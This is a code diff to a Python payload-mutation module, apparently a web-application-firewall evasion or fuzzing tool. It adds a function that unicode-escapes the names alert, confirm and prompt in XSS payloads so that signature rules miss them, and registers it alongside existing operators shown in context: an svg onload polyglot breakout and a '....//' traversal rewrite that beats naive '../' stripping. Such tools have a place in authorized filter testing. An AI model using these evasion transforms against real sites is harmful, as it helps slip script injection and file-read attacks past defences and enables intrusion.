@@ -202,6 +202,26 @@ def xss_polyglot(payload: str) -> str:
     return f'"><svg/onload={call}>'
 
 
+def xss_js_char_escape(payload: str) -> str:
+    """Escape the letters of any JS function name (alert/confirm/prompt) to
+    unicode \\uNNNN escapes so a signature rule matching the literal `alert(`
+    misses it; the leading letter stays literal, the rest is escaped, and the
+    argument list plus everything else are untouched, so the result is still
+    valid, behaviourally-identical JS (`a\\u006c\\u0065\\u0072\\u0074` ==
+    `alert`). Applies to every occurrence of the three names. Deterministic
+    (pure transform), so its exact output is pinned in tools/smoke.py."""
+    def _escape(s: str) -> str:
+        return s[0] + "".join(f"\\u{ord(c):04x}" for c in s[1:])
+    for name in ("alert", "confirm", "prompt"):
+        payload = re.sub(
+            r"\b" + name + r"\b",
+            lambda m: _escape(m.group(0)),
+            payload,
+            flags=re.IGNORECASE,
+        )
+    return payload
+
+
 def lfi_nested_traversal(payload: str) -> str:
     """Rewrites ../ as ....// (defeats naive single-pass '../' stripping)."""
     if "../" in payload or "..\\" in payload:
@@ -318,6 +338,7 @@ ALL_MUTATIONS = [
     xss_attr_breakout,
     xss_entity_obfuscate,
     xss_polyglot,
+    xss_js_char_escape,
     mysql_versioned_comment,
     whitespace_alt,
     sql_inline_comment_split,
@@ -338,7 +359,7 @@ OPERATORS_BY_CATEGORY = {
         case_randomize, add_whitespace_variants, insert_random_junk,
         html_entity_encode, url_encode_partial, script_null_byte_split,
         xss_event_handler_swap, xss_tag_vector_swap, xss_attr_breakout,
-        xss_entity_obfuscate, xss_polyglot, uri_case_fold,
+        xss_entity_obfuscate, xss_polyglot, xss_js_char_escape, uri_case_fold,
     ],
     "sqli": [
         case_randomize, add_sql_comment, add_whitespace_variants,
